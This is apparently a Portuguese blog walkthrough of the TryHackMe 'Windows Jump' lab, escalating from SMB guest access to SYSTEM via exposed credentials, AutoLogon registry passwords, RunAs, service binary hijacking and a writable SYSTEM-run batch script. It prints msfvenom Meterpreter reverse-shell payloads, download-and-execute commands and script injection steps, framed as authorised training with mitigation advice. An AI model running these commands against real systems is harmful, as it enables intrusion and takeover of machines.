---
layout: post
title: "Windows Jump - Do Guest ao SYSTEM: SMB, AutoLogon e Hijacking"
description: "Walkthrough TryHackMe Windows Jump: recon, credenciais expostas em SMB e Winlogon, RunAs, Service Binary Hijacking e execução até SYSTEM."
date: 2026-10-15
categories: [walkthrough, pentest, windows, tryhackme]
tags: [windows-jump, tryhackme, nmap, smb, netexec, rdp, winlogon, autologon, runas, service-binary-hijacking, icacls, msfvenom, metasploit, meterpreter, privilege-escalation]
---

# Windows Jump - Do Guest ao SYSTEM: SMB, AutoLogon e Hijacking

## 1. Objetivo e método para novas rooms

Na room **Windows Jump**, parti de acesso SMB como `guest` e cheguei a `NT AUTHORITY\SYSTEM`. Foram quatro transições, cada uma exigindo uma nova enumeração:

~~~text
guest (SMB)
  | credenciais em compartilhamento Public
  v
thmuser (RDP)
  | senha de AutoLogon no Registro
  v
notadmin (RunAs)
  | executável de serviço modificável
  v
svcadmin (Meterpreter)
  | script cleanup.bat modificável e executado como SYSTEM
  v
NT AUTHORITY\SYSTEM (Meterpreter)
~~~

> Laboratório autorizado do TryHackMe. Os endereços podem mudar ao reiniciar a máquina. Execute alterações e payloads somente em ambientes permitidos.

~~~text
Alvo:      10.64.185.84
AttackBox: 10.64.102.191
~~~

**Método que quero repetir:** reconhecer → enumerar → formular uma hipótese → testar → confirmar a identidade → começar o recon de novo. O objetivo é descobrir **o que posso controlar, quem executa e como comprovo o resultado**.

---

## 2. Primeiro passo: recon externo

Antes de escolher um exploit, preciso descobrir quais serviços estão disponíveis. Para cobrir todas as portas TCP:

~~~bash
nmap -sS -Pn -p- --open 10.64.185.84
~~~

Depois, enumero melhor as portas encontradas:

~~~bash
nmap -sV -sC -Pn -p135,139,445,3389,5985,5986 10.64.185.84
~~~

No laboratório encontrei:

| Porta | Serviço | O que procurar |
|---|---|---|
| 135 | MSRPC | Comunicação remota e informações via RPC |
| 139 | NetBIOS | Sessões SMB antigas |
| 445 | SMB | Compartilhamentos, acesso guest, permissões e arquivos |
| 3389 | RDP | Sessão gráfica com credenciais válidas |
| 5985 | WinRM HTTP | Administração remota via PowerShell |
| 5986 | WinRM HTTPS | Fechada neste alvo |

**Por onde começar?** Escolhi o SMB (445), porque poderia revelar arquivos sem precisar acessar o desktop.

| Opção Nmap | Função |
|---|---|
| `-sS` | SYN scan TCP |
| `-Pn` | Não exige resposta à descoberta por ping |
| `-p-` | Todas as 65.535 portas TCP |
| `--open` | Mostra as portas abertas |
| `-sV` | Identifica serviço/versão |
| `-sC` | Scripts NSE padrão |
| `-p135,139,...` | Portas específicas para detalhar |

---

## 3. guest → thmuser: descobrir e ler o SMB

**SMB** (*Server Message Block*) é usado para compartilhamento de arquivos e recursos Windows. Primeiro listei os *shares* sem informar senha:

~~~bash
smbclient -L //10.64.185.84 -N
~~~

Resultado:

~~~text
ADMIN$   Remote Admin
C$       Default share
IPC$     Remote IPC
Public   Public file share
~~~

A listagem não significa que posso ler todos esses compartilhamentos. Validei a conta `guest` com senha vazia e pedi as permissões:

~~~bash
netexec smb 10.64.185.84 -u guest -p '' --shares
~~~

| Compartilhamento | Permissão encontrada |
|---|---|
| `ADMIN$`, `C$` | Sem acesso indicado |
| `IPC$` | READ — comunicação entre processos, não pasta comum |
| `Public` | READ — arquivos compartilhados |

Acessei `Public`:

~~~bash
smbclient //10.64.185.84/Public -U 'guest%'
~~~

Dentro do SMB:

~~~text
ls
get welcome.txt
exit
~~~

Depois, na AttackBox:

~~~bash
cat welcome.txt
~~~

O arquivo continha credenciais de um novo funcionário:

~~~text
Username : thmuser
Password : Password1!
~~~

**Aprendizado:** encontrei **credenciais em texto puro em um compartilhamento legível por guest**. Não foi necessário brute force.

- `-L`: lista compartilhamentos; `-N`: não solicita senha.
- `-U 'guest%'`: usuário guest com senha vazia.
- `-u`, `-p ''`: usuário e senha vazia no NetExec; `--shares`: enumera os shares.
- `ls`: lista; `get`: baixa; `exit`: encerra o SMB.

**Próxima decisão:** testar as credenciais em um serviço que aceite login. Como RDP estava aberto, comecei por ele.

---

## 4. Primeiro acesso: thmuser via RDP

~~~bash
xfreerdp /v:10.64.185.84 /u:thmuser /p:'Password1!' /cert:ignore
~~~

- `/v:`: endereço do servidor; `/u:`: usuário; `/p:`: senha.
- `/cert:ignore`: ignora a validação do certificado RDP neste laboratório.

Após entrar no Windows, fiz a enumeração manual antes de baixar ferramentas:

~~~cmd
whoami
whoami /all
whoami /priv
net user
net localgroup
net localgroup Administrators
cmdkey /list
~~~

| Comando | O que pergunto ao sistema? |
|---|---|
| `whoami /all` | Qual conta, grupos, token e privilégios? |
| `whoami /priv` | Quais privilégios estão presentes e ativos? |
| `net user` | Que contas locais existem? |
| `net localgroup Administrators` | Quem é administrador? |
| `cmdkey /list` | Há credenciais no Credential Manager? |

A conta `thmuser` era um usuário comum, sem privilégio diretamente útil para escalação. `cmdkey` não mostrou credenciais; apenas `Administrator` apareceu no grupo local `Administrators`. Encontrei também perfis de `notadmin` e `svcadmin` em `C:\Users`.

Primeira flag:

~~~cmd
type C:\Users\thmuser\Desktop\flag1.txt
~~~

~~~text
THM{5mb_cr3d5_1n_th3_5h4r3}
~~~

**Dica:** o perfil ativo foi criado com sufixo `.PRIVESC`, mas a flag estava na pasta original sem sufixo. Se `%USERPROFILE%` não tiver o arquivo, liste `C:\Users`.

**Agora recomeço o recon:** com uma conta Windows válida, posso investigar Registro, arquivos de configuração, credenciais, serviços, scripts e permissões locais.

---

## 5. thmuser → notadmin: credenciais no AutoLogon

Consultei o Registro do Windows:

~~~cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
~~~

Encontrei:

~~~text
AutoAdminLogon    REG_SZ    1
DefaultUserName   REG_SZ    notadmin
DefaultPassword   REG_SZ    P@ssw0rd!
~~~

`AutoAdminLogon=1` indica logon automático habilitado. Os valores `DefaultUserName` e `DefaultPassword` armazenavam uma conta e sua senha **em texto puro**. `HKLM` significa *HKEY_LOCAL_MACHINE*.

Para consultar valores específicos em outras rooms:

~~~cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
~~~

`/v` seleciona o valor da chave.

Validei a credencial no SMB:

~~~bash
netexec smb 10.64.185.84 -u notadmin -p 'P@ssw0rd!'
~~~

O RDP de `notadmin` falhou com *Connection reset by peer*. Como a senha já tinha funcionado no SMB, usei o **RunAs** no CMD da minha sessão `thmuser`:

~~~cmd
runas /user:PRIVESC\notadmin cmd.exe
~~~

**O que é RunAs?** É uma ferramenta nativa do Windows que inicia **um novo processo com as credenciais de outra conta**. O Windows verifica a senha e cria o processo com o token de segurança de `notadmin`. O CMD anterior continua sendo de `thmuser`.

- `/user:PRIVESC\notadmin`: conta local `notadmin` do computador `PRIVESC`.
- `cmd.exe`: programa que será aberto com a identidade informada.
- A senha é solicitada depois; não precisa aparecer no comando.

**Por que funcionou?** A conta pôde iniciar um processo local mesmo sem conseguir abrir outra sessão RDP. Ter senha válida não garante autorização para entrar pelo Remote Desktop: cada tipo de logon pode ter restrições próprias. RunAs também não concede privilégios além dos que a outra conta já possui.

~~~cmd
whoami
type C:\Users\notadmin\Desktop\flag2.txt
~~~

~~~text
privesc\notadmin
THM{w1nl0g0n_cr3ds_3xp0s3d}
~~~

**Aprendizado:** um serviço remoto recusou a sessão, mas isso não invalidou a credencial. A confirmação da identidade no novo CMD foi fundamental.

---

## 6. Novo recon: notadmin → svcadmin por Service Binary Hijacking

Com `notadmin`, recomecei a enumeração: queria descobrir **se algum serviço era executado como `svcadmin`**.

~~~cmd
net user svcadmin
wmic service get Name,StartName,PathName | findstr /i "svcadmin"
~~~

Resultado:

~~~text
Serviço: THMSvc
Binário:  C:\Windows\THMSVC\svc.exe
Conta:    .\svcadmin
~~~

### O que é um serviço Windows?

É um programa de segundo plano gerenciado pelo **Service Control Manager (SCM)**. Pode iniciar automaticamente, sob demanda ou por evento, sem ninguém abrir o desktop. Em geral, sua configuração pertence à **máquina**, mas o processo é executado com uma **conta de segurança**, como `LocalSystem`, `LocalService`, `NetworkService` ou uma conta local/de domínio.

`.\svcadmin` **não** significa que o programa só roda quando esse usuário abre uma sessão RDP. Significa que o Windows inicia o processo usando a identidade `svcadmin`. Para descobrir a conta de execução, observe `SERVICE_START_NAME` em `sc qc` (ou `StartName` via PowerShell).

Inspecionei configurações, estado e permissões:

~~~cmd
sc qc THMSvc
sc query THMSvc
icacls C:\Windows\THMSVC
icacls C:\Windows\THMSVC\svc.exe
sc sdshow THMSvc
~~~

~~~text
SERVICE_START_NAME : .\svcadmin
START_TYPE         : DEMAND_START
STATE              : STOPPED

C:\Windows\THMSVC         PRIVESC\notadmin:(OI)(CI)(F)
C:\Windows\THMSVC\svc.exe Everyone:(F)
                          PRIVESC\notadmin:(I)(F)
~~~

Na saída de `sc qc THMSvc`, os campos significam:

| Campo | Leitura |
|---|---|
| `TYPE: 10 WIN32_OWN_PROCESS` | Serviço com processo próprio |
| `START_TYPE: 3 DEMAND_START` | Início sob demanda |
| `SERVICE_START_NAME: .\svcadmin` | Executa como a conta local `svcadmin` |
| `STATE: STOPPED` | Estava parado durante o teste |

No `icacls`, `(F)` significa **controle total** sobre o arquivo ou pasta (permissão NTFS).

Já `sc sdshow THMSvc`, que executei logo acima, exibiu o **descritor de segurança do serviço**. Um trecho **da saída real** foi:

~~~text
(A;;RPWP;;;BU)
~~~

| Campo | Significado nesse SDDL |
|---|---|
| `A` | *Allow*: entrada que permite ações |
| `RP` | Direito de iniciar o serviço (*SERVICE_START*) |
| `WP` | Direito de parar o serviço (*SERVICE_STOP*) |
| `BU` | Grupo `BUILTIN\Users` |

**ACE** é uma entrada de controle de acesso; **SDDL** é a linguagem textual usada para representar descritores de segurança. Ou seja, **`icacls` mostrou quem podia alterar o binário; `sc sdshow` mostrou quem podia controlar o serviço**. São permissões diferentes.

**Vulnerabilidade:** `notadmin` pode modificar `svc.exe`; o Windows o executa como `svcadmin`; e o serviço pode ser iniciado. É **Service Binary Hijacking**.

### Criar um executável para serviço Windows

Na AttackBox:

~~~bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.64.102.191 LPORT=4444 -f exe-service -o svc.exe
~~~

- `-p`: escolhe o payload Meterpreter reverso.
- `LHOST`: IP que recebe a conexão; `LPORT`: porta de retorno.
- `-f exe-service`: formato preparado para serviço Windows.
- `-o`: arquivo gerado.

O primeiro payload que tentei era `-f exe` e abriu sessão rapidamente, mas morreu. Para um executável lançado pelo *Service Control Manager*, o formato `exe-service` é mais adequado.

### Preparar o handler

~~~bash
msfconsole -q
~~~

`-q` é *quiet*: abre o Metasploit sem o banner inicial. Não desativa o handler ou as mensagens das sessões.

~~~text
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter_reverse_tcp
set LHOST 10.64.102.191
set LPORT 4444
run
~~~

O **handler** é o listener do Metasploit: fica aguardando a conexão iniciada pelo payload. Em outro terminal da AttackBox, no diretório de `svc.exe`:

~~~bash
python3 -m http.server 8000
~~~

No CMD de `notadmin`, fiz backup antes de substituir:

~~~cmd
copy C:\Windows\THMSVC\svc.exe C:\Windows\THMSVC\svc.exe.bak
powershell -NoProfile -Command "Invoke-WebRequest -Uri http://10.64.102.191:8000/svc.exe -OutFile C:\Windows\THMSVC\svc.exe"
sc start THMSvc
~~~

O `sc start` retornou **erro 1053** (o serviço não respondeu ao controle de inicialização a tempo), mas a conexão Meterpreter aconteceu. Ou seja, **erro de inicialização do serviço não prova falha do payload**.

No Meterpreter:

~~~text
getuid
getpid
shell
~~~

No CMD remoto:

~~~cmd
whoami
type C:\Users\svcadmin\Desktop\flag3.txt
~~~

~~~text
privesc\svcadmin
THM{s3rv1c3_b1n4ry_h1j4ck3d}
~~~

`getuid` identifica a conta no Meterpreter; `getpid`, o ID do processo. `whoami` pertence ao CMD/PowerShell, então usei `shell` antes.

---

## 7. Novo recon: svcadmin → SYSTEM por script gravável

Com `svcadmin`, executei novamente `whoami /all`. O token não tinha `SeImpersonatePrivilege` nem `SeDebugPrivilege`. Possuía `SeCreateGlobalPrivilege`, mas **criar certos objetos globais não concede SYSTEM automaticamente**.

Busquei serviços `LocalSystem` e tarefas agendadas. Não encontrei uma configuração explorável nessas listagens. Um arquivo em `C:\Windows\Tasks` chamou atenção:

~~~cmd
dir C:\Windows\Tasks /a
type C:\Windows\Tasks\cleanup.bat
icacls C:\Windows\Tasks\cleanup.bat
~~~

Script original:

~~~bat
@echo off
del /Q /F "%TEMP%\*.tmp" 2>nul
~~~

ACL encontrada:

~~~text
BUILTIN\Users:(I)(RX)
PRIVESC\svcadmin:(I)(M)
BUILTIN\Administrators:(I)(F)
NT AUTHORITY\SYSTEM:(I)(F)
~~~

`(M)` é **modificar**; `(RX)` é ler e executar; `(I)` indica permissão herdada. A pista é boa, mas sozinha não prova elevação: **precisamos confirmar quem executa o script**.

### Teste de execução sem payload

No PowerShell de `svcadmin` (atenção: `Get-ScheduledTask` não é comando do CMD), fiz cópia do arquivo e escrevi uma prova simples:

~~~powershell
Copy-Item C:\Windows\Tasks\cleanup.bat "$env:TEMP\cleanup.bat.bak"
Set-Content C:\Users\Public\cleanup-proof.txt 'PENDING'
Add-Content C:\Windows\Tasks\cleanup.bat 'whoami > C:\Users\Public\cleanup-proof.txt 2>&1'
~~~

Após aguardar:

~~~powershell
Get-Content C:\Users\Public\cleanup-proof.txt
~~~

Resultado:

~~~text
nt authority\system
~~~

O arquivo de prova foi atualizado às 13:25 no horário da VM. Isso **comprova a execução como SYSTEM**.

Procurei referências ao script em `schtasks`, `Get-ScheduledTask`, arquivos de definição em `System32\Tasks` e serviços; as pesquisas retornaram vazias. A consulta ao histórico do Task Scheduler também não identificou o responsável. **Portanto, não consegui descobrir qual mecanismo disparava o script**. Seria incorreto atribuir a execução a uma tarefa específica sem evidência.

A primeira prova tentou usar `C:\Windows\Temp`, mas o acesso negado não permitiu interpretar o resultado. Mudei para `C:\Users\Public`, onde pude consultar o arquivo. Também evitei adicionar várias vezes a mesma linha com `>>`/`Add-Content`, pois esses operadores acrescentam conteúdo.

### Usar o script para uma sessão SYSTEM

Na AttackBox, agora gerei um **EXE comum**: ele será iniciado pelo `.bat`, e não diretamente como serviço.

~~~bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.64.102.191 LPORT=4445 -f exe -o system.exe
python3 -m http.server 8000
~~~

Em outro terminal:

~~~bash
msfconsole -q
~~~

~~~text
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter_reverse_tcp
set LHOST 10.64.102.191
set LPORT 4445
run
~~~

No PowerShell de `svcadmin`:

~~~powershell
Invoke-WebRequest -UseBasicParsing -Uri 'http://10.64.102.191:8000/system.exe' -OutFile 'C:\Users\Public\system.exe'
Test-Path C:\Users\Public\system.exe
Add-Content C:\Windows\Tasks\cleanup.bat 'start "" "C:\Users\Public\system.exe"'
~~~

`Test-Path` confirma a existência do arquivo. `Add-Content` acrescenta a linha. No CMD, `start ""` usa o primeiro par de aspas para o título vazio da janela e depois informa o executável.

**Não executei o `.bat` manualmente**, pois ele herdaria meu contexto atual de `svcadmin`. Aguardei a execução automática, que já havia sido comprovada como SYSTEM. O handler recebeu a sessão final.

Validação no Meterpreter e no CMD:

~~~text
getuid
shell
~~~

~~~cmd
whoami
type C:\flag4.txt
~~~

A flag final estava em `C:\flag4.txt`, inacessível para `svcadmin`. **O valor da flag4 não foi registrado na conversa; não vou inventá-lo.** O acesso SYSTEM foi confirmado na conclusão da room.

**Diferença importante:** o token da sessão `svcadmin` não virou SYSTEM; o script executado por SYSTEM criou **outro processo**, com outra identidade.

---

## 8. Checklist reutilizável para outras rooms

| Fase | Pergunta | Ferramenta ou comando |
|---|---|---|
| Recon externo | Quais portas existem? | `nmap -p-`, `-sV -sC` |
| SMB | Há guest/anônimo? Que arquivos posso ler? | `smbclient`, `netexec smb --shares` |
| Primeiro acesso | Quem sou e quais grupos/privilégios? | `whoami /all`, `net user`, `net localgroup` |
| Credenciais | Há senhas no Registro ou arquivos? | `reg query ...Winlogon`, `cmdkey /list` |
| Novo usuário | Posso abrir sessão, executar RunAs ou WinRM? | `xfreerdp`, `runas`, `netexec` |
| Serviços | Qual conta executa e quem modifica o binário? | `wmic service`, `sc qc`, `icacls` |
| Scripts/tarefas | Quem escreve? Quem executa? Quando? | `icacls`, `schtasks`, `Get-ScheduledTask` |
| Prova | O comando rodou com qual identidade? | `whoami` gravado em arquivo, `getuid` |
| Pós-exploit | O que o novo acesso permite? | Repetir enumeração e verificar a flag |

### Referência rápida: siglas e operadores

| Comando / sintaxe | Significado |
|---|---|
| SMB / RDP / RPC / WinRM | Compartilhamento / Desktop remoto / procedimento remoto / gerenciamento remoto |
| ACL / SDDL | Lista de controle de acesso / formato do descritor de segurança |
| `sc qc`, `sc query`, `sc start` | Configuração, estado e inicialização de serviço |
| `icacls` | Mostra permissões de arquivos e diretórios Windows |
| `wmic ... \| findstr /i` | Filtra resultados sem diferenciar maiúsculas de minúsculas |
| `>`, `>>` | Sobrescreve e acrescenta saída a arquivo |
| `2>&1` | Redireciona erros para a saída normal |
| `2>nul` | Descarta erros no CMD |
| `exe-service` / `exe` | Formato próprio para serviço / executável Windows comum |
| `Invoke-WebRequest -OutFile` | Baixa conteúdo e salva em arquivo |
| `multi/handler` | Listener para receber a conexão reversa |

**Dicas que ficaram:**

- Não pular recon após cada usuário: cada nova identidade muda as permissões disponíveis.
- Validar credenciais antes de atribuir a falha do RDP à senha.
- Ler permissões antes de gerar payloads; o `Everyone:(F)` no serviço era decisivo.
- Diferenciar serviço iniciado, payload executado e identidade comprovada.
- Não confundir um script gravável com execução privilegiada até aparecer uma prova (`whoami`).
- Se uma busca por tarefas retornar vazia, isso não prova que o script nunca é executado.

### Mitigação e limpeza

- Não guardar senhas em texto puro em shares SMB ou no `DefaultPassword` do AutoLogon.
- Restringir escrita em executáveis de serviços e scripts consumidos por processos privilegiados.
- Usar contas de serviço com o mínimo necessário de privilégios e revisar permissões de inicialização.
- Monitorar alterações em binários de serviço, scripts e execuções incomuns como SYSTEM.
- Ao terminar o laboratório, restaurar o `svc.exe` e o `cleanup.bat` de suas cópias e remover payloads, arquivos de prova e listeners de teste.

---

## 9. Posts relacionados

- [Windows Privilege Escalation — Backup Operators, Tokens e Druva inSync]({% post_url 2026-10-13-windows-privilege-escalation %}): tokens, serviços e outras técnicas Windows.
- [Linux Jump — Do Recon ao Root]({% post_url 2026-10-13-jump-recon-ftp-privesc %}): mesma lógica de enumeração e pivôs entre usuários.
- [Bind Shell e Reverse Shell — do Netcat ao Socat/TLS]({% post_url 2026-10-07-bind-reverse-shell %}): listeners e conexões reversas.
- [Checkmate — Quebrando senhas!]({% post_url 2026-10-03-checkmate %}): credenciais previsíveis e reconhecimento direcionado.

## Conclusão

~~~text
SMB com credenciais expostas              → thmuser
AutoLogon com senha exposta               → notadmin
Executável de serviço modificável        → svcadmin
Script modificável executado como SYSTEM → SYSTEM
~~~

A principal lição da room não foi um comando específico: **reconhecer, encontrar permissões perigosas, provar quem executa e repetir o processo depois de cada novo acesso**.